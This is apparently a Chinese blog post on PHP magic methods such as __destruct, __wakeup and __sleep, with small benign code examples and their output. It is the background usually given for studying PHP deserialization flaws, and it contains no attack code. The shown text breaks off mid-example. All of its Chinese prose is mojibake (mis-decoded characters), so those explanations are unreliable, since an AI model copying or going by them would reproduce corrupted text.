<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__construct</span>()	<span class="comment">//å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__destruct</span>() 	<span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__wakeup</span>() 	<span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__sleep</span>() 	<span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__toString</span>() 	<span class="comment">//æŠŠç±»å½“åšå­—ç¬¦ä¸²æ—¶è§¦å‘</span></span><br><span class="line">&#123;å› ä¸ºechoæ— æ³•è¾“å‡ºå¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¯¥é­”æ³•æ–¹æ³•ï¼Œåœ¨ç›´æ¥è¾“å‡ºå¯¹è±¡å¼•ç”¨çš„æ—¶å€™ï¼Œå°±ä¸ä¼šäº§ç”Ÿé”™è¯¯ï¼Œè€Œæ˜¯è‡ªåŠ¨è°ƒç”¨äº†â€<span class="built_in">__toString</span>()â€æ–¹æ³•, è¾“å‡ºâ€œ<span class="built_in">__toString</span>()â€æ–¹æ³•ä¸­è¿”å›çš„å­—ç¬¦ï¼Œæ‰€ä»¥â€œ<span class="built_in">__toString</span>()â€æ–¹æ³•ä¸€å®šè¦æœ‰ä¸ªè¿”å›å€¼(return è¯­å¥)&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">__get</span>() 	<span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__set</span>() 	<span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__invoke</span>()  <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__call</span>()     <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__callStatic</span>()  <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__isset</span>()   <span class="comment">//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__set_state</span>()   <span class="comment">//è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__clone</span>()  <span class="comment">//å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__autoload</span>()   <span class="comment">//å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__debugInfo</span>()   <span class="comment">//æ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Â·æ³¨æ„ï¼šPHP å°†æ‰€æœ‰ä»¥ __ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚æ‰€ä»¥åœ¨å®šä¹‰ç±»æ–¹æ³•æ—¶ï¼Œé™¤äº†ä¸Šè¿°é­”æœ¯æ–¹æ³•ï¼Œå»ºè®®ä¸è¦ä»¥ __ ä¸ºå‰ç¼€ã€‚</span><br><span class="line"></span><br><span class="line">Â·<span class="built_in">__sleep</span>() å’Œ <span class="built_in">__wakeup</span>()</span><br><span class="line">public __sleep ( void ) : array</span><br><span class="line">__wakeup ( void ) : void</span><br><span class="line"></span><br><span class="line">serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰__sleep() ä¸èƒ½è¿”å›çˆ¶ç±»çš„ç§æœ‰æˆå‘˜çš„åå­—ã€‚è¿™æ ·åšä¼šäº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚å¯ä»¥ç”¨ Serializable æ¥å£æ¥æ›¿ä»£ã€‚</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰__sleep() æ–¹æ³•å¸¸ç”¨äºæäº¤æœªæäº¤çš„æ•°æ®ï¼Œæˆ–ç±»ä¼¼çš„æ¸…ç†æ“ä½œã€‚åŒæ—¶ï¼Œå¦‚æœæœ‰ä¸€äº›å¾ˆå¤§çš„å¯¹è±¡ï¼Œä½†ä¸éœ€è¦å…¨éƒ¨ä¿å­˜ï¼Œè¿™ä¸ªåŠŸèƒ½å°±å¾ˆå¥½ç”¨ã€‚</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰ä¸ä¹‹ç›¸åï¼Œunserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰__wakeup() ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚</span><br><span class="line"></span><br><span class="line">Â·è®¿é—®æ§åˆ¶</span><br><span class="line">PHP å¯¹å±æ€§æˆ–æ–¹æ³•çš„è®¿é—®æ§åˆ¶ï¼Œæ˜¯é€šè¿‡åœ¨å‰é¢æ·»åŠ å…³é”®å­— publicï¼ˆå…¬æœ‰ï¼‰ï¼Œprotectedï¼ˆå—ä¿æŠ¤ï¼‰æˆ– privateï¼ˆç§æœ‰ï¼‰æ¥å®ç°çš„ã€‚</span><br><span class="line">publicï¼ˆå…¬æœ‰ï¼‰ï¼šå…¬æœ‰çš„ç±»æˆå‘˜å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®ã€‚</span><br><span class="line">protectedï¼ˆå—ä¿æŠ¤ï¼‰ï¼šå—ä¿æŠ¤çš„ç±»æˆå‘˜åˆ™å¯ä»¥è¢«å…¶è‡ªèº«ä»¥åŠå…¶å­ç±»å’Œçˆ¶ç±»è®¿é—®ã€‚</span><br><span class="line">privateï¼ˆç§æœ‰ï¼‰ï¼šç§æœ‰çš„ç±»æˆå‘˜åˆ™åªèƒ½è¢«å…¶å®šä¹‰æ‰€åœ¨çš„ç±»è®¿é—®ã€‚</span><br><span class="line"></span><br><span class="line">Â·unserialize() å°†å·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸå› PHP çš„å€¼ã€‚</span><br><span class="line">åºåˆ—åŒ–è¯·ä½¿ç”¨ serialize() å‡½æ•°ã€‚</span><br><span class="line"></span><br><span class="line">è¯­æ³•</span><br><span class="line">unserialize(str)</span><br><span class="line"></span><br><span class="line">å‚æ•° æè¿°</span><br><span class="line">str å¿…éœ€ã€‚ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</span><br><span class="line">__wakeup()æ˜¯ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ã€‚unserialize()ä¼šæ£€æŸ¥å­˜åœ¨ä¸€ä¸ª__wakeup()æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™å…ˆä¼šè°ƒç”¨__wakeup()æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure></div>



<hr>
<h5 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h5><p><code>__construct()</code>è¢«ç§°ä¸ºæ„é€ æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åœ¨åˆ›é€ ä¸€ä¸ªå¯¹è±¡æ—¶å€™ï¼Œé¦–å…ˆä¼šå»æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•ã€‚ä½†æ˜¯åœ¨<code>åºåˆ—åŒ–</code>å’Œ<code>ååºåˆ—åŒ–</code>è¿‡ç¨‹æ˜¯ä¸ä¼šè§¦å‘çš„ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__construct test</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåˆ›å»ºå¯¹è±¡çš„æ—¶å€™è§¦å‘äº†ä¸€æ¬¡ï¼Œåœ¨åé¢çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½æ²¡æœ‰è§¦å‘ã€‚</p>
<hr>
<h5 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h5><p>åœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__destruct test</span><br><span class="line">__destruct test</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†ä¸¤æ¬¡<code>__destruct()</code>ï¼Œå› ä¸ºä¸€ä¸ªå°±æ˜¯å®ä¾‹åŒ–çš„æ—¶å€™åˆ›å»ºçš„å¯¹è±¡ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ååºåˆ—åŒ–åç”Ÿæˆçš„å¯¹è±¡ã€‚</p>
<hr>
<h5 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h5><p>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__call()</code> ä¼šè¢«è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ è°ƒç”¨äº†ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°**__call**éœ€è¦å®šä¹‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯è¡¨ç¤ºè°ƒç”¨çš„å‡½æ•°åï¼Œä¸€èˆ¬å¼€å‘ä¼šåœ¨è¿™é‡ŒæŠ¥é”™å†™xxxä¸å­˜åœ¨è¿™ä¸ªå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ å…¥çš„æ•°ç»„ï¼Œè¿™é‡Œåªä¼ å…¥äº†ä¸€ä¸ªaã€‚</p>
<hr>
<h5 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h5><p>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__callStatic()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå…ˆæ¥å­¦ä¹ ä¸€ä¸‹åŒå†’å·çš„ç”¨æ³•ï¼ŒåŒå†’å·ä¹Ÿå«åšèŒƒå›´è§£ææ“ä½œç¬¦ï¼ˆä¹Ÿå¯ç§°ä½œ Paamayim Nekudotayimï¼‰æˆ–è€…æ›´ç®€å•åœ°è¯´æ˜¯ä¸€å¯¹å†’å·ï¼Œå¯ä»¥ç”¨äºè®¿é—®é™æ€æˆå‘˜ï¼Œç±»å¸¸é‡ï¼Œè¿˜å¯ä»¥ç”¨äºè¦†ç›–ç±»ä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚è‡ª PHP 5.3.0 èµ·ï¼Œå¯ä»¥é€šè¿‡å˜é‡æ¥å¼•ç”¨ç±»ï¼Œè¯¥å˜é‡çš„å€¼ä¸èƒ½æ˜¯å…³é”®å­—ï¼ˆå¦‚ <strong>self</strong>ï¼Œ<strong>parent</strong> å’Œ <strong>static</strong>ï¼‰ã€‚ä¸**__call<strong>ä¸åŒçš„æ˜¯éœ€è¦æ·»åŠ </strong>static**ï¼Œåªæœ‰è®¿é—®ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ‰ä¼šè§¦å‘ã€‚</p>
<hr>
<h5 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h5><p>è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<code>__get()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure></div>

<p><code>__get</code>é­”æœ¯æ–¹æ³•éœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨ç€è®¿é—®ä¸å­˜åœ¨çš„å±æ€§å€¼ã€‚</p>
<hr>
<h5 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h5><p>ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<code>__set()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><strong>set</strong>è·Ÿ<strong>get</strong>ç›¸åï¼Œä¸€ä¸ªæ˜¯è®¿é—®ä¸å­˜åœ¨çš„å±æ€§ï¼Œä¸€ä¸ªæ˜¯ç»™ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼ã€‚</p>
<hr>
<h5 id="isset"><a href="#isset" class="headerlink" title="__isset"></a>__isset</h5><p>å¯¹<strong>ä¸å¯è®¿é—®å±æ€§</strong>ï¼ˆæ¯”å¦‚privateçš„å±æ€§ï¼‰è°ƒç”¨ <strong>isset()</strong> æˆ– <strong>empty()</strong> æ—¶ï¼Œ<code>__isset()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure></div>

<p>è¯¥é­”æœ¯æ–¹æ³•ä½¿ç”¨äº†<strong>isset()<strong>æˆ–è€…</strong>empty()<strong>åªè¦å±æ€§æ˜¯</strong>private</strong>æˆ–è€…ä¸å­˜åœ¨çš„éƒ½ä¼šè§¦å‘ã€‚</p>
<hr>
<h5 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h5><p>å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <strong>unset()</strong> æ—¶ï¼Œ**__unset()** ä¼šè¢«è°ƒç”¨ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†é­”æœ¯æ–¹æ³• <code>__unset()</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <strong>unset()</strong> å‡½æ•°æ¥é”€æ¯ç±»çš„ç§æœ‰çš„å±æ€§ï¼Œæˆ–åœ¨é”€æ¯ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶å¾—åˆ°é€šçŸ¥ã€‚</p>
<hr>
<h5 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h5><p><strong>serialize()</strong> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span 